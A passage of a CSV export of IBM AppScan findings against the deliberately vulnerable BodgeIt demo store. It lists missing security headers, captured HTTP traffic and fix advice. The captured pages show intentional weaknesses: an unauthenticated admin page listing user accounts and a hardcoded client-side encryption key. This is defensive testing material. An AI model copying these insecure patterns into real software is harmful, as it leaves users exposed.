Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>About Us</h3> Here at the BodgeIt Store we live up to our name and our motto!<br/><br/> OK, so this is really a test application that contains a range of vulnerabilities.<br/><br/> How many can you find and exploit?? <br/><br/> Check your progress on the <a href=""score.jsp"">Scoring page</a>. </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the Content-Security-Policy response header is missing, which increases exposure to various cross-site injection attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""Content-Security-Policy"" header.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","89","Missing ""X-Content-Type-Options"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/admin.jsp","admin.jsp","","http://localhost/bodgeit/admin.jsp","","GET /bodgeit/admin.jsp HTTP/1.1 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Transfer-Encoding: chunked Date: Thu, 15 Oct 2015 22:25:55 GMT Set-Cookie: JSESSIONID=EDE37A61DABCAC7B7CC7EDB0F1F31F06; Path=/bodgeit/; HttpOnly <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Admin page</h3> <br/><center><table class=""border"" width=""80%""> <tr><th>UserId</th><th>User</th><th>Role</th><th>BasketId</th></tr> <tr> <td>1</td><td>user1@thebodgeitstore.com</td><td>USER</td><td>83</td> </tr> <tr> <td>2</td><td>admin@thebodgeitstore.com</td><td>ADMIN</td><td>0</td> </tr> <tr> <td>3</td><td>test@thebodgeitstore.com</td><td>USER</td><td>1</td> </tr> </table></center><br/> <br/><center><table class=""border"" width=""80%""> <tr><th>BasketId</th><th>UserId</th><th>Date</th></tr> <tr> <td>1</td><td>3</td><td>2015-10-15 17:17:03.131</td> </tr> <tr> <td>2</td><td>0</td><td>2015-10-15 17:20:54.62</td> </tr> <tr> <td>3</td><td>0</td><td>2015-10-15 17:20:59.854</td> </tr> <tr> <td>4</td><td>0</td><td>2015-10-15 17:20:59.917</td> </tr> <tr> <td>5</td><td>0</td><td>2015-10-15 17:20:59.932</td> </tr> <tr> <td>6</td><td>0</td><td>2015-10-15 17:22:07.026</td> </tr> <tr> <td>7</td><td>0</td><td>2015-10-15 17:22:07.073</td> </tr> <tr> <td>8</td><td>0</td><td>2015-10-15 17:22:07.073</td> </tr> <tr> <td>9</td><td>0</td><td>2015-10-15 17:22:07.073</td> </tr> <tr> <td>10</td><td>0</td><td>2015-10-15 17:22:07.104</td> </tr> <tr> <td>11</td><td>0</td><td>2015-10-15 17:22:07.12</td> </tr> <tr> <td>12</td><td>0</td><td>2015-10-15 17:22:07.136</td> </tr> <tr> <td>13</td><td>0</td><td>2015-10-15 17:22:07.136</td> </tr> <tr> <td>14</td><td>0</td><td>2015-10-15 17:22:07.136</td> </tr> <tr> <td>15</td><td>0</td><td>2015-10-15 17:22:07.167</td> </tr> <tr> <td>16</td><td>0</td><td>2015-10-15 17:22:07.167</td> </tr> <tr> <td>17</td><td>0</td><td>2015-10-15 17:22:07.167</td> </tr> <tr> <td>18</td><td>0</td><td>2015-10-15 17:22:07.198</td> </tr> <tr> <td>19</td><td>0</td><td>2015-10-15 17:22:07.214</td> </tr> <tr> <td>20</td><td>0</td><td>2015-10-15 17:22:07.214</td> </tr> <tr> <td>21</td><td>0</td><td>2015-10-15 17:22:07.229</td> </tr> <tr> <td>22</td><td>0</td><td>2015-10-15 17:22:07.261</td> </tr> <tr> <td>23</td><td>0</td><td>2015-10-15 17:22:07.276</td> </tr> <tr> <td>24</td><td>0</td><td>2015-10-15 17:22:10.167</td> </tr> <tr> <td>25</td><td>0</td><td>2015-10-15 17:22:10.526</td> </tr> <tr> <td>26</td><td>0</td><td>2015-10-15 17:22:10.542</td> </tr> <tr> <td>27</td><td>0</td><td>2015-10-15 17:22:10.558</td> </tr> <tr> <td>28</td><td>0</td><td>2015-10-15 17:22:10.636</td> </tr> <tr> <td>29</td><td>0</td><td>2015-10-15 17:22:10.651</td> </tr> <tr> <td>30</td><td>0</td><td>2015-10-15 17:22:11.495</td> </tr> <tr> <td>31</td><td>0</td><td>2015-10...","","AppScan detected that the X-Content-Type-Options response header is missing, which increases exposure to drive-by download attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""X-Content-Type-Options"" header with value ""nosniff"" on all outgoing requests.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","86","Missing ""X-Content-Type-Options"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/advanced.jsp","advanced.jsp","","http://localhost/bodgeit/advanced.jsp","","GET /bodgeit/advanced.jsp HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/search.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3262 Date: Thu, 15 Oct 2015 22:20:57 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <SCRIPT> loadfile('./js/encryption.js'); var key = ""220c0686-495f-45""; function validateForm(form){ var query = document.getElementById('query'); var q = document.getElementById('q'); var val = encryptForm(key, form); if(val){ q.value = val; query.submit(); } return false; } function encryptForm(key, form){ var params = form_to_params(form).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/""/g, '&quot;').replace(/'/g, '&#39'); if(params.length > 0) return Aes.Ctr.encrypt(params, key, 128); return false; } </SCRIPT> <h3>Search</h3> <font size=""-1""> <form id=""advanced"" name=""advanced"" method=""POST"" onsubmit=""return validateForm(this);false;""> <table> <tr><td>Product:</td><td><input id='product' type='text' name='product' /></td></td> <tr><td>Description:</td><td><input id='desc' type='text' name='description' /></td></td> <tr><td>Type:</td><td><input id='type' type='text' name='type' /></td></td> <tr><td>Price:</td><td><input id='price' type='text' name='price' /></td></td> <tr><td></td><td><input type='submit' value='Search'/></td></td> </table> </form> <form id=""query"" name=""advanced"" method=""POST""> <input id='q' type=""hidden"" name=""q"" value="""" /> </form> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the X-Content-Type-Options response header is missing, which increases exposure to drive-by download attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""X-Content-Type-Options"" header with value ""nosniff"" on all outgoing requests.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","80","Missing ""Content-Security-Policy"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/basket.jsp","basket.jsp","","http://localhost/bodgeit/basket.jsp","","POST /bodgeit/basket.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31; b_id=3 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/basket.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 34 quantity_11=1&update=Update+Basket HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3298 Date: Thu, 15 Oct 2015 22:21:01 GMT <script type=""text/javascript""> function incQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity (prodid) { var q = document.getElementById('quantity_' + prodid); if (q != null) { var val = --q.value; if (val < 0) { val = 0; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Basket</h3> <p style=""color:green"">Your basket had been updated.</p><br/> <form action=""basket.jsp"" method=""post""> <table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Quantity</th><th>Price</th><th>Total</th></tr> <tr> <td><a href=""product.jsp?prodid=11"">TGJ CCC</a></td> <td style=""text-align: center"">&nbsp;<a href=""#"" onclick=""decQuantity(11);""><img src=""images/130.png"" alt=""Decrease quantity in basket"" border=""0""></a>&nbsp;<input id=""quantity_11"" name=""quantity_11"" value=""1"" maxlength=""2"" size = ""2"" style=""text-align: right"" READONLY />&nbsp;<a href=""#"" onclick=""incQuantity(11);""><img src=""images/129.png"" alt=""Increase quantity in basket"" border=""0""></a>&nbsp;</td> <td align=""right"">$0.70</td> </td><td align=""right"">$0.70</td> </tr> <tr><td>Total</td><td style=""text-align: center""><input id=""update"" name=""update"" type=""submit"" value=""Update Basket""/></td><td>&nbsp;</td><td align=""right"">$0.70</td></tr> </table> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the Content-Security-Policy response header is missing, which increases exposure to various cross-site injection attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""Content-Security-Policy"" header.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","81","Missing ""X-Content-Type-Options"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/contact.jsp","contact.jsp","","http://localhost/bodgeit/contact.jsp","","POST /bodgeit/contact.jsp HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/contact.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) Content-Length: 48 null=&anticsrf=0.17311905722928855&comments=1234 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2446 Date: Thu, 15 Oct 2015 22:20:58 GMT <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <br/><p style=""color:red"">There was a problem with your feedback, please try again.</p><br/> <h3>Contact Us</h3> Please send us your feedback: <br/><br/> <form method=""POST""> <input type=""hidden"" id=""user"" name=""null"" value=""""/> <input type=""hidden"" id=""anticsrf"" name=""anticsrf"" value=""0.07522503076070819""></input> <center> <table> <tr> <td><textarea id=""comments"" name=""comments"" cols=80 rows=8></textarea></td> </tr> <tr> <td><input id=""submit"" type=""submit"" value=""Submit""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","","AppScan detected that the X-Content-Type-Options response header is missing, which increases exposure to drive-by download attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""X-Content-Type-Options"" header with value ""nosniff"" on all outgoing requests.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","96","Missing ""X-Content-Type-Options"" header","","Low","Open","2015-10-15","IBM Security AppScan Standard","358","Improperly Implemented Security Check for Standard","","/bodgeit/js/encryption.js","encryption.js","","http://localhost/bodgeit/js/encryption.js","","GET /bodgeit/js/encryption.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/advanced.jsp Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""16546-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 16546 Date: Thu, 15 Oct 2015 22:21:01 GMT /* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - */ /* AES implementation in JavaScript (c) Chris Veness 2005-2011 */ /* - see http://csrc.nist.gov/publications/PubsFIPS.html#197 */ /* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - */ var Aes = {}; // Aes namespace /** * AES Cipher function: encrypt 'input' state with Rijndael algorithm * applies Nr rounds (10/12/14) using key schedule w for 'add round key' stage * * @param {Number[]} input 16-byte (128-bit) input state array * @param {Number[][]} w Key schedule as 2D byte-array (Nr+1 x Nb bytes) * @returns {Number[]} Encrypted output state array */ Aes.cipher = function(input, w) { // main Cipher function [§5.1] var Nb = 4; // block size (in words): no of columns in state (fixed at 4 for AES) var Nr = w.length/Nb - 1; // no of rounds: 10/12/14 for 128/192/256-bit keys var state = [[],[],[],[]]; // initialise 4xNb byte-array 'state' with input [§3.4] for (var i=0; i<4*Nb; i++) state[i%4][Math.floor(i/4)] = input[i]; state = Aes.addRoundKey(state, w, 0, Nb); for (var round=1; round<Nr; round++) { state = Aes.subBytes(state, Nb); state = Aes.shiftRows(state, Nb); state = Aes.mixColumns(state, Nb); state = Aes.addRoundKey(state, w, round, Nb); } state = Aes.subBytes(state, Nb); state = Aes.shiftRows(state, Nb); state = Aes.addRoundKey(state, w, Nr, Nb); var output = new Array(4*Nb); // convert state to 1-d array before returning [§3.4] for (var i=0; i<4*Nb; i++) output[i] = state[i%4][Math.floor(i/4)]; return output; } /** * Perform Key Expansion to generate a Key Schedule * * @param {Number[]} key Key as 16/24/32-byte array * @returns {Number[][]} Expanded key schedule as 2D byte-array (Nr+1 x Nb bytes) */ Aes.keyExpansion = function(key) { // generate Key Schedule (byte-array Nr+1 x Nb) from Key [§5.2] var Nb = 4; // block size (in words): no of columns in state (fixed at 4 for AES) var Nk = key.length/4 // key length (in words): 4/6/8 for 128/192/256-bit keys var Nr = Nk + 6; // no of rounds: 10/12/14 for 128/192/256-bit keys var w = new Array(Nb*(Nr+1)); var temp = new Array(4); for (var i=0; i<Nk; i++) { var r = [key[4*i], key[4*i+1], key[4*i+2], key[4*i+3]]; w[i] = r; } for (var i=Nk; i<(Nb*(Nr+1)); i++) { w[i] = new Array(4); for (var t=0; t<4; t++) temp[t] = w[i-1][t]; if (i % Nk == 0) { temp = Aes.subWord(Aes.rotWord(temp)); for (var t=0; t<4; t++) temp[t] ^= Aes.rCon[i/Nk][t]; } else if (Nk > 6 && i%Nk == 4) { temp = Aes.subWord(temp); } for (var t=0; t<4; t++) w[i][t] = w[i-Nk][t] ^ temp[t]; } return w; } /* * ---- remaining routines are private, not called externally ---- */ Aes.subBytes = function(s, Nb) { // apply SBox to state S [§5.1.1] for (var r=0; r<4; r++) { for (var c=0; c<Nb; c++) s[r][c] = Aes.sBox[s[r][c]]; } return s; } Aes.shiftRows = function(s, Nb) { // shift row r of state S left by r bytes [§5.1.2] var t = new Array(4); for (var r=1; r<4; r++) { for (var c=0; c<4; c++) t[c] = s[r][(c+r)%Nb]; // shift into temp copy for (var c=0; c<4; c++) s[r][c] = t[c]; // and copy back } // note that this will work for Nb=4,5,6, but not 7,8 (always 4 for AES): return s; // see asmaes.sourceforge.net/rijndael/rijndaelImplementation.pdf } Aes.mixColumns = function(s, Nb) { // combine bytes of each col of state S [§5.1.3] for (var c=0; c<4; c++) { var a = new Array(4); // 'a' is a copy of the current column from 's' var b = new Array(4); // 'b' is a•{02} in GF(2^8) for (var i=0; i<4; i++) { a[i] = s[i][c]; b[i] = s[i][c]&0x80 ? s[i][c]<<1 ^ 0x011b : s[i][c]<<1; } // a[n] ^ b[n] is a•{03} in GF(2^8) s[0][c] = b[0] ^ a[1] ^ b[1] ^ a[2] ^ a[3]; // 2*a0 + 3*a1 + a2 + a3 s[1][c] = a[0] ^ b[1] ^ a[2] ^ b[2] ^ a[3]; // a0 * 2*a1 + 3*a2 + a3 s[2][c] = a[0] ^ a[1] ^ b[2] ^ a[3] ^ b[3]; // a0 + a1 + 2*a2 + 3*a3 s[3][c] = a[0] ^ b[0] ^ a[1] ^ a[2] ^ b[3]; // 3*a0 + a1 + a2 + 2*a3 } return s; } Aes.addRoundKe...","","AppScan detected that the X-Content-Type-Options response header is missing, which increases exposure to drive-by download attacks","<fixRecommendations> <fixRecommendation type=""General""> <text>Configure your server to send the ""X-Content-Type-Options"" header with value ""nosniff"" on all outgoing requests.</text> <br></br> <text>For Apache, see: </text> <link target=""http://httpd.apache.org/docs/2.2/mod/mod_headers.html"">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</link> <text>For IIS, see: </text> <link target=""https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx"">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</link> <text>For nginx, see: </text> <link target=""http://nginx.org/en/docs/http/ngx_http_headers_module.html"">http://nginx.org/en/docs/http/ngx_http_headers_module.html</link> </fixRecommendation>","","",""
